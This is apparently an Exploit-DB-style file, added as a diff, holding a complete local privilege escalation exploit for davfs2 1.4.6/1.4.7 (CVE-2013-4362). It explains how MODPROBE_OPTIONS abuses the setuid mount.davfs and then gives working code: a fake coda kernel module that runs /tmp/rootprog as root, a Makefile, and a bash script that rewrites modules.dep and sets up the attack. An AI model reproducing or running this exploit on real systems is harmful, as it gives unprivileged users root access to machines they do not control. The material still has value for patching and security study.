@@ -1,0 +1,192 @@
+davfs2 1.4.6/1.4.7 local privilege escalation exploit
+
+*Bug Description*: 
+davfs2 is a Linux utility which allows OS users to mount a remote webdav server as a local partition. The bug is well
+documented at http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=723034. Basically the program "mount.davfs" runs as
+root with setuid and executes some calls to system() which allows to pass environment variables which can alter the
+system behavior.
+
+*Exploit Description*: 
+calls to system() execute the "modprobe" command. An unprivileged, local authenticated user can set the
+"MODPROBE_OPTIONS" environment variable to pass a user controlled path, allowing the load of an arbitrary kernel
+module. The provided PoC contains a kernel module code which transfers back the execution to a "/tmp/rootprog" that
+can contain user-mode code of choice which will run with root privileges. PLEASE, NOTE THAT THE PROVIDED POC COMES
+UNARMED, YOU HAVE TO COMPILE THE USER MODE CODE WHICH YOU WANT TO RUN. The exploit has been tested on an Ubuntu-based
+x86_64 system but should work on other distributions, too.
+
+*Conditions for successful exploitation*: 
+
+1-At least one of the module 'fuse' or 'coda' must not be loaded in the kernel. The provided PoC works with coda,
+which is not loaded by default in most debian-based distributions.
+
+2-The user which the attacker is impersonating must be allowed to mount remote webdav servers:
+
+eviluser@host:~/hacks/davfs2$ cat /etc/group | grep davfs2
+davfs2:x:1001:eviluser
+
+3-davfs2 uses /etc/fstab to define which remote servers can be mounted by users. The user which the attacker is
+impersonating must be allowed to mount at least one remote Webdav server. If this server uses authentication, the
+attacker must be aware of the webdav credentials.
+
+eviluser@host:~/hacks/davfs2$ cat /etc/fstab | grep davfs
+https://www.crushftp.com/demo/   /home/eviluser/media/dav   davfs   noauto,user   0   0
+
+####################################################################################################
+#
+# coda.c
+#
+####################################################################################################
+
+/*
+coda.c - fake coda module that executes a user-mode program
+*/
+
+#include <linux/module.h>	
+#include <linux/kernel.h>	
+
+int init_module(void)
+{
+	struct subprocess_info *sub_info;
+	char *argv[] = { "/tmp/rootprog", NULL, NULL };
+	static char *envp[] = {"HOME=/tmp/","TERM=linux","PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+        
+
+	sub_info = call_usermodehelper_setup( argv[0], argv, envp, GFP_ATOMIC );
+
+        if (sub_info == NULL) 
+		{
+		printk(KERN_INFO "call_usermodehelper_setup failed \n");
+		return -ENOMEM;
+		}
+	else
+		{
+		printk(KERN_INFO "w00t!!!\n");
+		call_usermodehelper_exec( sub_info, UMH_WAIT_PROC );
+		}
+
+	return 0;
+}
+
+void cleanup_module(void)
+{
+	printk(KERN_INFO "Exiting.\n");
+}
+
+
+
+####################################################################################################
+#
+# Makefile
+#
+####################################################################################################
+
+
+obj-m += coda.o
+
+all:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+clean:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+
+
+
+####################################################################################################
+#
+# exploit.sh
+#
+####################################################################################################
+
+
+#!/bin/bash
+
+# Exploit Title: davfs2 1.4.6/1.4.7 local privilege escalation exploit
+# Date: 05/10/2013
+# Exploit Author: Lorenzo Cantoni
+# Vendor Homepage: http://savannah.nongnu.org/projects/davfs2
+# Version: 1.4.6 (tested), 1.4.7 (untested)
+# Tested on: Xubuntu 12.04 x86_64
+# CVE: 2013-4362 
+# Info: Vulnerability reported by Werner Baumann: http://www.securityfocus.com/bid/62445
+
+KERNELV=`uname -r`
+echo "#######################################"
+echo "Specify the full path of the kernel module which you want to load"
+echo "Leave empty if you wish to compile it now"
+echo "Understand that you need kernel headers, make and gcc for successful compilation"
+echo "#######################################"
+read EXPLOITMODPATH
+
+if [ -z $EXPLOITMODPATH ]; then
+make
+EXPLOITMODPATH=$PWD/coda.ko
+fi
+
+echo "#######################################"
+echo "Copying the modules in use for the running kernel in the local directory"
+echo "#######################################"
+mkdir -p lib/modules
+cp -R /lib/modules/`uname -r` lib/modules
+
+echo "#######################################"
+echo "Copying coda.ko module"
+echo "#######################################"
+cp $EXPLOITMODPATH $PWD/lib/modules/$KERNELV/kernel/fs/coda
+
+echo "#######################################"
+echo "Setting the 'modules.dep' and running depmod"
+echo "#######################################"
+
+echo -n $PWD | sed 's/\//\\\//g' > /tmp/escapedpwd
+ESCAPEDPWD=`cat /tmp/escapedpwd`
+
+OLD_CODA_PATH="kernel\/fs\/coda\/coda.ko"
+NEW_CODA_PATH="$ESCAPEDPWD\/lib\/modules\/$KERNELV\/kernel\/fs\/coda\/coda.ko"
+
+sed 's/'$OLD_CODA_PATH'/'$NEW_CODA_PATH'/g' $PWD/lib/modules/$KERNELV/modules.dep  > /tmp/new_modules.dep
+
+cat /tmp/new_modules.dep | sed 's/\\//g' > /tmp/modules.dep.ok
+
+cp /tmp/modules.dep.ok $PWD/lib/modules/$KERNELV/modules.dep
+
+depmod -b $PWD
+echo "#######################################"
+echo "Specify the user-mode ELF which you whish to copy in /tmp/rootprog that will be run as root. Default value is $PWD/rootprog"
+echo "WARNING !!!!!!!! YOU HAVE ONLY 1 SHOT !!!!! unmounting webdav partitions doesn't unload the coda.ko module"
+echo "#######################################"
+read ROOTPROG
+
+if [ -z $ROOTPROG ]; then
+ROOTPROG=$PWD/rootprog
+fi
+
+cp $ROOTPROG /tmp/rootprog
+
+echo "#######################################"
+echo "Setting MODPROBE_OPTIONS variable"
+echo "#######################################"
+export MODPROBE_OPTIONS="-d $PWD"
+
+echo "#######################################"
+echo "Now, check the the $HOME/.davfs2/davfs.conf. Modify the default value of 'kernel_fs' to coda eg:"
+echo "# General Options"
+echo "# ---------------"
+echo ""
+echo "# dav_user        davfs2            # system wide config file only"
+echo "# dav_group       davfs2            # system wide config file only"
+echo "# ignore_home                       # system wide config file only"
+echo "kernel_fs       coda"
+echo "# buf_size        16                 # KiByte"
+echo "#######################################"
+echo "#######################################"
+echo "Then, check /etc/fstab for remote webdav servers which the user can mount, eg:"
+echo "https://www.crushftp.com/demo/   /home/foo/dav   davfs   noauto,user   0   0"
+echo "#######################################"
+echo "#######################################"
+echo "If the remote webdav is authenticated, ensure to have valid credentials. The run 'mount /home/foo/dav' inside this terminal'"
+echo "#######################################"
+rm /tmp/escapedpwd
+rm /tmp/new_modules.dep
+rm /tmp/modules.dep.ok
+
+exec /bin/bash -i
